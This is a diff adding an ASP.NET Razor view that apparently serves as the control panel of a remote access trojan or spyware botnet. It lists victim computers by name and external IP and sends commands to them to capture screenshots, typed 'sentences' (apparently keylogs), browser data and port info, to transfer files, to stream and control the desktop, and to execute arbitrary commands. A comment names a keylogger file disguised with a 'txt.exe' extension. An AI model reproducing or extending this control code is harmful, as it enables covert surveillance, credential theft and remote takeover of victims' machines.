@@ -1,0 +1,300 @@
+﻿@{
+    ViewBag.Title = "Home Page";
+}
+<form role="form" class="form-inline">
+    <div class="form-group">
+        <label for="computer">Computer</label>
+        <select id="computer" class="form-control"></select>
+    </div>
+
+    <div class="form-group">
+        <label for="command">Command</label>
+        <select id="command" class="form-control">
+            <option value="DO_NOTHING">Do nothing</option>
+            <option value="UPLOAD_IMAGE">Get image</option>
+            <option value="UPLOAD_SENTENCES">Get sentences</option>
+            <option value="UPLOAD_PORT_INFO">Get port info</option>
+            <option value="UPLOAD_BROWSER_DATA">Get browser data</option>
+            <option value="DOWNLOAD_FILE">Upload a file</option>
+            <option value="UPLOAD_FILE">Download a file</option>
+            <option value="UPLOAD_FILE_EVENTS">Get file events</option>
+            <option value="STREAM_DESKTOP">Start streaming desktop</option>
+            <option value="STOP_STREAM_DESKTOP">Stop streaming desktop</option>
+            <option value="EXECUTE_COMMAND">Execute a command</option>
+            <option value="SET_TRANSMISSION_INTERVAL">Set transmission time</option>
+        </select>
+    </div>
+
+    <div class="form-group">
+        <label for="FileName">File</label>
+        <input type="text" class="form-control" name="FileName" id="FileName" />
+        @*<span id="subCommand"></span>*@
+    </div>
+
+    <div class="form-group">
+        <label for="Parameters">Parameters</label>
+        <input type="text" class="form-control" name="Parameters" id="Parameters" />
+    </div>
+
+    @*<div class="form-group">
+            <input id="fileupload" type="file" name="files[]" multiple />
+            <div id="progress" class="progress">
+                <div class="progress-bar progress-bar-success"></div>
+            </div>
+            <div id="files" class="files"></div>
+        </div>*@
+
+    <div class="form-group">
+        <button type="submit" id="execute" class="btn btn-primary">Execute</button>
+    </div>
+</form>
+<div id="data"></div>
+<ul id="images"></ul>
+
+<script>
+    //var fileToUpload = '';
+    //var fileToDownload = '';
+    //var imageQuality = 20;
+    var cursorX = 0;
+    var cursorY = 0;
+    var computerList = {};
+    var computerHash = "";
+
+
+    function updateImage() {
+        setTimeout(function () {
+            $('#data').html("");
+            var img = $('<img />').attr('width', '100%').attr('src', "/Home/GetImage?image=latest.jpg");
+            $('#data').html(img);
+            //$.get('/Home/GetImage?image=latest.jpg').done(function (image) {
+            //    console.log(image);
+            //    var img = $('<img />').attr('width', '100%').attr('src', image);
+            //    $('#data').html(img);
+            //});
+            
+            //$.get('core/getlatestimage.inc.php')
+            //    .done(function (imageUrl) {
+            //        console.log(imageUrl);
+            //        var img = $('<img />').attr('width', '100%').attr('src', imageUrl);
+            //        $('#data').html(img);
+            //    });
+        }, 1000);
+    }
+    function updateSentences() {
+        $.get('/Home/GetSentences')
+            .done(function (text) {
+                var txt = $('<textarea />').addClass('form-control').attr('cols', '100').attr('rows', '20').val(text);
+                $('#data').html(txt);
+            });
+    }
+    function updatePortInfo() {
+        $.get('/Home/GetPortInfo', function (json) {
+            var txt = $('<textarea />').attr('cols', '100').attr('rows', '20').val(json);
+            $('#data').html(txt);
+        });
+    }
+    function StartStreamDesktop() {
+        var imageStream = $('<img />').attr('id', 'streamDesktop');
+        $('#data').html(imageStream);
+        $('#streamDesktop')
+            .click(function (e) {
+                cursorX = e.offsetX;
+                cursorY = e.offsetY;
+                //alert(cursorX + ", " + cursorY);
+                //editSettings('MOVE_CURSOR', imageQuality, "", "", "", "", cursorX, cursorY, "");
+                editSettings('MOVE_CURSOR', "", "", cursorX, cursorY, "");
+
+            });
+        /*$(window).keyup(function(e) {
+            editSettings('MOVE_CURSOR', imageQuality, "", "", "", cursorX, cursorY, e.keyCode);
+        });*/
+        setInterval(function () {
+            imageStream.attr('src', "/DataFromClient/latest.jpg");
+        }, 1000);
+    }
+    function UploadFile() {
+        $('#fileupload').show();
+
+    }
+
+    function loadComputers(computerList) {
+        $.getJSON('/Home/GetComputers').done(function (data) {
+            var json = JSON.parse(data);
+            console.log(json);
+            if (_.size(computerList) !== _.size(json)) {
+                //alert(_.size(computerList));
+                computerList = {};
+                //loadComputers(computerList);
+                //alert(_.size(computerList) + "," + _.size(data));
+                _.extend(computerList, json);
+                $('#computer')
+                    .find('option').remove().end()
+                    .append($('<option />').attr('value', 'none').html("None"))
+                    .append($('<option />').attr('value', 'all').html("All"));
+                $.each(json, function (k, v) {
+                    //var value = v['Name'] + " (" + v['IpExternal'] + " - " + v['Hash'] + ")";
+                    var value = v['Name'] + " (" + v['IpExternal'] + ")";
+                    $('#computer').append($('<option />').attr('value', v['Hash']).html(value));
+                });
+            }
+
+            //_.extend(computerList, json);
+            //$('#computer')
+            //    .find('option').remove().end()
+            //    .append($('<option />').attr('value', 'none').html("None"))
+            //    .append($('<option />').attr('value', 'all').html("All"));
+            //$.each(json, function (k, v) {
+            //    //var value = v['Name'] + " (" + v['IpExternal'] + " - " + v['Hash'] + ")";
+            //    var value = v['Name'] + " (" + v['IpExternal'] + ")";
+            //    $('#computer').append($('<option />').attr('value', v['Hash']).html(value));
+            //});
+        });
+        /*
+            $.getJSON('/Data/computers.json')
+                .done(function (data) {
+                    console.log(_.size(data));
+                    //alert(_.size(computerList) + "," + _.size(data));
+                    if (_.size(computerList) !== _.size(data)) {
+                        //alert(_.size(computerList));
+                        computerList = {};
+                        loadComputers(computerList);
+                        //alert(_.size(computerList) + "," + _.size(data));
+                    }
+                });*/
+    }
+    //function editSettings(command, imageQuality, fileName, fileArgs, fileToUpload, fileToDownload, cursorX, cursorY, keyCode) {
+    function editSettings(command, file, parameters, cursorX, cursorY, keyCode) {
+        var data = {
+            'ComputerHash': computerHash,
+            'Command': command,
+            'File': file,
+            'Parameters': parameters,
+            'HasExectuted': false,
+            //'imageQuality': imageQuality,
+            //'fileName': fileName,
+            //'fileArgs': fileArgs,
+            //'fileToUpload': fileToUpload,
+            //'fileToDownload': fileToDownload,
+            'cursorX': cursorX,
+            'cursorY': cursorY,
+            'keyCode': keyCode
+        };
+
+        //alert(data['computerHash']);
+        $.post('/api/values/SaveSettings', data, function (result) {
+            console.log("result: " + result);
+            //$('#command').val('DO_NOTHING');
+            //$('#subCommand').html("");
+            switch (command) {
+                case 'UPLOAD_IMAGE':
+                    updateImage();
+                    break;
+                case 'UPLOAD_SENTENCES':
+                    updateSentences();
+                    break;
+                case 'UPLOAD_PORT_INFO':
+                    updatePortInfo();
+                    break;
+                case 'STREAM_DESKTOP':
+                    StartStreamDesktop();
+                    break;
+                case 'DOWNLOAD_FILE':
+                    UploadFile();
+                    break;
+            }
+        }, "json");
+        //.fail(function (data) {
+        //    console.log('failed');
+        //    resetSettings();
+        //});
+    }
+    $(function () {
+        //editSettings('DO_NOTHING', imageQuality, "", "", fileToUpload, fileToDownload, cursorX, cursorY, "");
+        //$().downloadFile('KeyLogTest.txt', 'KeyLogTest txt.exe', 'text/plain');
+        //setInterval(function () {
+        //    /*$.get('core/getimages.inc.php')
+        //        .done(function(jsonData) {
+        //            $('#images').find('li').remove();
+        //            var jsonArray = JSON.parse(jsonData);
+        //            $.each(jsonArray, function(i, val) {
+        //                var href = $('<a></a>').attr('href', val['url']);
+        //                var img = $('<img />').attr('width', '125px').attr('src', val['url']);
+        //                $('#images').append($('<li></li>').html(href.html(img)));
+        //            });
+        //        });*/
+
+        //    loadComputers(computerList);
+
+        //}, 5000);
+
+        //$('#fileuploadContent').hide();
+
+        loadComputers(computerList);
+
+        $('#computer').change(function () {
+            computerHash = $(this).find(':selected').val();
+            //alert(computerHash);
+        });
+
+        //$('#imageQuality').val(imageQuality);
+
+        //function SetUploadImage() {
+        //    $('#subCommand').html('Image quality: <input type="text" id="imageQuality" value="" />');
+        //    $('#imageQuality').keyup(function () {
+        //        var input = $(this);
+        //        if (input.val() > 100) {
+        //            input.val(100);
+        //        }
+        //        else if (input.val() < 0) {
+        //            input.val(0);
+        //        }
+        //    });
+        //};
+
+        //$('#command').change(function () {
+        //    var command = $(this).find(':selected').val();
+        //    switch (command) {
+        //        case 'UPLOAD_IMAGE':
+        //            SetUploadImage();
+        //            break;
+        //        case 'EXECUTE_COMMAND':
+        //            $('#subCommand').html('File: <input type="text" class="form-control" id="fileName" value="" /> Parameters: <input type="text" class="form-control" id="fileArgs" value="" />');
+        //            break;
+        //        case 'DOWNLOAD_FILE':
+        //            //$('#subCommand').html('File: <input id="fileupload" type="file" name="files[]" multiple /><div id="progress" class="progress"><div class="progress-bar progress-bar-success"></div></div><div id="files" class="files"></div>');
+        //            break;
+        //        case 'UPLOAD_FILE':
+        //            $('#subCommand').html('File: <input id="fileToDownload" type="text" />');
+        //            break;
+        //        default:
+        //            $('#subCommand').html("");
+        //            break;
+        //    }
+        //});
+
+        $('form').submit(function (e) {
+            e.preventDefault();
+            var command = $('#command').find(':selected').val();
+            //console.log("command: " + command);
+            var file = $('#FileName').val();
+            var parameters = $('#Parameters').val();
+            //alert(command + " - " + file + " - " + parameters);
+            editSettings(command, file, parameters, cursorX, cursorY, "");
+
+            //imageQuality = $('#imageQuality').val();
+            //var fileName = $('#fileName').val();
+            //var fileArgs = $('#fileArgs').val();
+            //fileToDownload = $('#fileToDownload').val();
+            //editSettings(command, imageQuality, fileName, fileArgs, fileToUpload, fileToDownload, cursorX, cursorY, "");
+            //setTimeout(function () {
+            //    resetSettings();
+            //}, 999);
+            return false;
+        });
+    });
+
+    function resetSettings() {
+        editSettings('DO_NOTHING', "", "", cursorX, cursorY, "");
+        //editSettings('DO_NOTHING', imageQuality, "", "", fileToUpload, fileToDownload, cursorX, cursorY, "");
+    }
+</script>
